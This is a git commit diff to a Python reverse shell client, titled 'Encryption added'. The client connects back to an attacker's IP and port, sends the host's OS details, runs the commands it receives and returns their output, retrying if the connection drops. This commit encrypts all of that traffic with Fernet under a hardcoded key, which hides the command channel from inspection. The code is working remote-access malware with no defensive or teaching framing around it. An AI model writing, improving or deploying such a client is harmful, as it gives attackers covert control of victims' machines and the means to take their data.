8e017723b1de4a55bc7d3166000dd390b8280964
mny015 <himalnath3@gmail.com>
2025-07-18 22:19:12 +0545

    Encryption added

--- client.py
+++ client.py
@@ -4,10 +4,15 @@ import time
 import sys
 import platform
 import os
+from cryptography.fernet import Fernet
+
+# Must be the same key as server
+SECRET_KEY = b'3QnL_4-vkUB45Vfi5MwDTRSOKaaEBhPY-q5Whh4bfyo='
+fernet = Fernet(SECRET_KEY)
 
 def reverse_shell(attacker_ip, attacker_port):
     retry_delay = 1
-    current_dir = os.getcwd()  # Store current working directory
+    current_dir = os.getcwd()
 
     while True:
         try:
@@ -15,18 +20,22 @@ def reverse_shell(attacker_ip, attacker_port):
             s.connect((attacker_ip, attacker_port))
             retry_delay = 1
 
+            # Get OS info and send encrypted
             os_info = platform.platform()
-            s.send(os_info.encode())
+            encrypted_os_info = fernet.encrypt(os_info.encode())
+            s.send(encrypted_os_info)
 
             while True:
-                cmd = s.recv(4096).decode()
+                # Receive and decrypt command
+                encrypted_cmd = s.recv(4096)
+                cmd = fernet.decrypt(encrypted_cmd).decode()
+
                 if not cmd:
                     break
                 if cmd.lower() == "exit":
                     s.close()
                     sys.exit(0)
 
-                # Handle "cd" manually
                 if cmd.startswith("cd "):
                     path = cmd[3:].strip()
                     try:
@@ -44,7 +53,10 @@ def reverse_shell(attacker_ip, attacker_port):
 
                 if not output:
                     output = "[No output]\n"
-                s.send(output.encode())
+
+                # Encrypt and send output
+                encrypted_output = fernet.encrypt(output.encode())
+                s.send(encrypted_output)
 
             s.close()
 
